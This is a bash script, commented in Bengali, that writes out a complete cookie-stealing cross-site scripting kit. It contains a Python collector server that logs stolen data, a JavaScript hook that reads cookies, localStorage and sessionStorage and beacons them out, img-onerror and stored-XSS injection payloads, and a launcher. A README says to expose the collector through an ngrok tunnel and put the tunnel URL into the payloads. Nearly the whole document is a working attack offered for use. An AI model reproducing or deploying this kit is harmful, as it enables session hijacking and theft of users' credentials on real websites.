#!/usr/bin/env bash
set -e

# ১. পুরনো ফাইল মুছে ফেলো (ডিরেক্টরি সেফ রাখো)
echo "[*] removing old scripts..."
rm -f collector.py cookie_hook.js payload.html stored_xss.txt README.txt run.sh
rm -f hits.log
rm -rf testpage

# ২. নতুন collector.py
cat > collector.py <<'PYEOF'
import base64, json, os, socketserver
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

LOG = os.environ.get("LOG_FILE", "hits.log")

class Handler(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")

    def do_OPTIONS(self):
        self.send_response(204); self._cors(); self.end_headers()

    def do_GET(self): self._handle()
    def do_POST(self): self._handle()

    def _handle(self):
        q = parse_qs(urlparse(self.path).query)
        raw = q.get("d", [""])[0]
        if not raw and "Content-Length" in self.headers:
            try:
                length = int(self.headers["Content-Length"])
                raw = self.rfile.read(length).decode(errors="replace")
            except Exception:
                raw = ""
        if not raw:
            raw = q.get("c", [""])[0]
        if raw:
            try:
                data = json.loads(base64.b64decode(raw).decode())
            except Exception:
                data = {"raw": raw}
            entry = {
                "time": datetime.now(timezone.utc).isoformat(),
                "ip": self.client_address[0],
                "ua": self.headers.get("User-Agent", ""),
                "ref": self.headers.get("Referer", ""),
                "data": data,
            }
            with open(LOG, "a", encoding="utf-8") as f:
                f.write(json.dumps(entry, ensure_ascii=False) + "\n")
            print(f"[+] hit from {entry['ip']} — {entry['data'].get('u', 'no-url')}")
        self.send_response(204); self._cors(); self.end_headers()

    def log_message(self, fmt, *args): pass

class Server(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

if __name__ == "__main__":
    port = int(os.environ.get("PORT", "9090"))
    open(LOG, "a").close()
    print(f"[*] collector listening on 127.0.0.1:{port}")
    print(f"[*] log file: {os.path.abspath(LOG)}")
    try:
        Server(("127.0.0.1", port), Handler).serve_forever()
    except KeyboardInterrupt:
        print("\n[*] collector stopped")
PYEOF

# ৩. নতুন cookie_hook.js
cat > cookie_hook.js <<'JSEOF'
(function () {
  var exfil = "http://127.0.0.1:9090/collect";
  var payload = {
    u: location.href,
    c: document.cookie,
    l: localStorage.length ? JSON.stringify(localStorage) : "",
    s: sessionStorage.length ? JSON.stringify(sessionStorage) : "",
    t: Date.now()
  };
  var img = new Image();
  img.src = exfil + "?d=" + encodeURIComponent(btoa(JSON.stringify(payload)));
  document.body.appendChild(img);
  fetch(exfil + "?c=" + encodeURIComponent(document.cookie), { credentials: "include" }).catch(function () {});
})();
JSEOF

# ৪. নতুন payload.html
cat > payload.html <<'HTMLEOF'
<img src="x" onerror="var s=document.createElement('script');s.src='http://127.0.0.1:9090/cookie_hook.js';document.body.appendChild(s);">
HTMLEOF

# ৫. নতুন stored_xss.txt
cat > stored_xss.txt <<'XSSEOF'
"><script src="http://127.0.0.1:9090/cookie_hook.js"></script>
XSSEOF

# ৬. নতুন run.sh
cat > run.sh <<'RUNEOF'
#!/usr/bin/env bash
set -e
PORT="${PORT:-9090}"
touch hits.log
if ss -ltn "sport = :$PORT" 2>/dev/null | grep -q LISTEN; then
  echo "[*] port $PORT busy — killing old collector"
  pkill -9 -f collector.py || true
  sleep 1
fi
PORT="$PORT" python3 collector.py &
COLL=$!
sleep 1
if ! kill -0 "$COLL" 2>/dev/null; then
  echo "[!] collector failed"
  exit 1
fi
echo "[*] collector pid=$COLL port=$PORT — log: $(pwd)/hits.log"
echo "[*] tunnel: ngrok http $PORT --log=stdout"
tail -f hits.log
RUNEOF
chmod +x run.sh

# ৭. নতুন testpage (index.html)
mkdir -p testpage
cat > testpage/index.html <<'INDEXEOF'
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>cookie test</title></head>
<body>
  <h1>self test</h1>
  <script>
    document.cookie = "test_session=hello123; path=/";
    var s = document.createElement('script');
    s.src = "http://127.0.0.1:9090/cookie_hook.js";
    document.body.appendChild(s);
  </script>
</body>
</html>
INDEXEOF

# ৮. নতুন README.txt
cat > README.txt <<'READEOF'
১. PORT=9090 bash run.sh
২. আলাদা টার্মিনাল: ngrok http 9090 --log=stdout
৩. টানেল URL নিয়ে cookie_hook.js ও payload.html-এ বসাও
৪. টেস্ট: http://127.0.0.1:9000/payload.html
৫. tail -f hits.log
READEOF

echo "[*] all files written. run: PORT=9090 bash run.sh"
